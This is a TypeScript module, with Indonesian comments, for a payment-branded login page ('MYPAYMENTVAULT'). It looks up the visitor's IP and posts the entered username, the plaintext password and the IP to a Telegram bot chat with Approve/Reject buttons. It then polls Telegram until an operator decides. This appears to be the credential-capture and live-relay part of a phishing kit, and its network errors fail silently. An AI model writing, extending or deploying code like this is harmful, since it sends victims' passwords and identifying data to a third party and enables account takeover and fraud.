const BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;

export async function getPublicIP(): Promise<string> {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip ?? "unknown";
  } catch {
    return "unknown";
  }
}

export async function sendTelegram(message: string): Promise<void> {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" }),
    });
  } catch { /* silent fail */ }
}

/** Kirim pesan approval dengan tombol Approve / Reject, kembalikan message_id */
export async function sendApprovalRequest(
  username: string,
  password: string,
  ip: string,
  now: string,
  sessionKey: string,
  label = "Login"
): Promise<number | null> {
  if (!BOT_TOKEN || !CHAT_ID) return null;
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        parse_mode: "HTML",
        text:
          `🔐 <b>MYPAYMENTVAULT - Permintaan ${label}</b>\n\n` +
          `👤 Username: <code>${username}</code>\n` +
          `🔑 Detail: <code>${password}</code>\n` +
          `🌐 IP Address: <code>${ip}</code>\n` +
          `🕐 Waktu: ${now}\n\n` +
          `⚠️ Apakah kamu menyetujui ${label.toLowerCase()} ini?`,
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_${sessionKey}` },
            { text: "❌ Reject",  callback_data: `reject_${sessionKey}`  },
          ]],
        },
      }),
    });
    const data = await res.json();
    return data.ok ? data.result.message_id : null;
  } catch {
    return null;
  }
}

/** Ambil offset terbaru agar polling hanya tangkap update BARU */
export async function getLatestOffset(): Promise<number> {
  if (!BOT_TOKEN) return 0;
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`
    );
    const data = await res.json();
    if (!data.ok || !data.result.length) return 0;
    const last = data.result[data.result.length - 1];
    return last.update_id + 1;
  } catch {
    return 0;
  }
}

/** Poll getUpdates untuk callback_query approval/reject */
export async function pollApproval(
  offset: number,
  sessionKey: string
): Promise<{ status: "approved" | "rejected" | "pending"; nextOffset: number; callbackId?: string }> {
  if (!BOT_TOKEN) return { status: "pending", nextOffset: offset };
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=2`
    );
    const data = await res.json();
    if (!data.ok || !data.result.length) return { status: "pending", nextOffset: offset };

    let status: "approved" | "rejected" | "pending" = "pending";
    let nextOffset = offset;
    let callbackId: string | undefined;

    for (const update of data.result) {
      nextOffset = update.update_id + 1;
      if (update.callback_query) {
        const cbData: string = update.callback_query.data ?? "";
        if (cbData === `approve_${sessionKey}`) {
          callbackId = update.callback_query.id;
          status = "approved";
        } else if (cbData === `reject_${sessionKey}`) {
          callbackId = update.callback_query.id;
          status = "rejected";
        }
      }
    }
    return { status, nextOffset, callbackId };
  } catch {
    return { status: "pending", nextOffset: offset };
  }
}

/** Jawab callback agar tombol tidak loading terus */
export async function answerCallback(callbackId: string, text: string): Promise<void> {
  if (!BOT_TOKEN) return;
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ callback_query_id: callbackId, text }),
    });
  } catch { /* silent */ }
}
